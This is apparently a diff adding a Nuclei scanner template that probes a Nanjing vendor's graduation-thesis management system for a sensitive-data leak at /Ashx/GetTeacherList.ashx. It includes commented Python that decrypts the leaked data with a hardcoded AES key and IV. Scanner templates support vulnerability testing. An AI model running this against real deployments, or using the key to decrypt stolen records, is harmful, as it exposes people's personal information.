@@ -1,0 +1,46 @@
+id: bysjgl-GetTeacherList-info
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 南京先极科技有限公司毕业设计GetTeacherList（论文）智能管理系统存在敏感信息泄露漏洞
+  reference:
+    - https://www.yuque.com/hacktwo/dtdx2v/kxeo2dmroge6w03q>
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Ashx/GetTeacherList.ashx"
+    matchers:
+      - type: status
+        status:
+          - 200
+#python脚本实现aes解密
+#from Crypto.Cipher import AES
+#from Crypto.Util.Padding import unpad
+#import base64
+#
+#def aes_decrypt(word):
+    # 密钥和IV（初始化向量）
+#    key = b"Easyman-easyman3"  # 转换为字节
+#    iv = b"Easyman-easyman3"  # 转换为字节
+
+    # 将Base64密文解码为字节
+#    encrypted_data = base64.b64decode(word)
+
+    # 创建AES解密器，使用CBC模式
+#    cipher = AES.new(key, AES.MODE_CBC, iv)
+
+    # 解密并去除填充
+#    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+
+    # 返回解密后的明文字符串
+#    return decrypted_data.decode('utf-8')
+
+# 示例用法
+#encrypted_base64 = "4Hl4iRSThOjTq1MMPan6OS3Ne9SqroYkOxh9jywuyKSPNNrVZBr8TWq6GpnMKw8MmrgZfoYori9G2wiXwFvzmA=="
+#try:
+#    decrypted_text = aes_decrypt(encrypted_base64)
+#    print("解密后的明文:", decrypted_text)
+#except Exception as e:
+#    print("解密失败:", str(e))
